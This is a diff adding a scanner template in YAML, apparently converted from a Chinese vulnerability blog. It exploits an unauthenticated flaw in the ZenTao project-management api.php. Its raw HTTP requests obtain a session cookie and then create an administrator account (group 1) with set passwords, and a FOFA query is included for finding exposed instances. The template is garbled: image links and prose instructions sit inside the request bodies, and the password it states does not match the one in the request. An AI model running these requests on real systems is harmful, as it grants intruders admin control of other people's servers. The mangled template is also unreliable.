@@ -1,0 +1,116 @@
+id: poc-tf8ne5g6qch110i8
+info:
+  name: 禅道api.php存在未授权登入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tf8ne5g6qch110i8'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tf8ne5g6qch110i8
+    fofa: title=“禅道”
+http:
+- raw:
+  - 'GET /zentaopms/www/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1747407814231-70ec6cba-8225-44a5-bc13-43c00263ede1.png)
+
+    Set-Cookie: zentaosid=c5gfr88h22f4vv73h4d0b453mv;
+
+    构造数据包，创建账户'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /zentaopms/www/api.php/v1/users HTTP/1.1
+
+    Host:ip
+
+    Cookie: zentaosid=c5gfr88h22f4vv73h4d0b453mv; lang=zh-cn; device=desktop; theme=default
+
+
+    {"account": "longl", "password": "Qwe123", "realname": "longl", "group":"1"}
+
+    "group":"1"为管理员分组
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1747407814476-04c4d709-c0d7-4286-b1cd-2a64258e0450.png)
+
+    登入账号
+
+    账号：longl
+
+    密码：Qwest23
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1747407814728-50290704-f43b-4f42-a704-7452e026c755.png)
+
+    **POC2:**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=dddidkyodsnfamzvjidb&branch=klmnehgxnsmeuhshbooy HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+    发起的请求中如果携带了默认的cookie 需要删除再发送请求
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1747407815002-1e687eb8-3e7f-4739-b019-d2e2e5d45f74.png)
+
+    创建账号可以直接构造POC'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /zentao/api.php/v1/users HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br
+
+    Cookie: zentaosid=上一部获取的有效cookie;
+
+    Connection: close
+
+    Content-Length: 88
+
+
+    {"account":"rootroot","password":"Qwe123","realname":"rootroot","role":"","group":"1"}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1747407815318-272b68c8-2992-4ea3-ae5c-d577e989ffdb.png)
+
+    然后即可成功登录。
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1747407815578-2706c7b0-af28-48cf-8aef-cd26cc1feb15.png)
+
+    **POC3:**
+
+    获取cookie'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
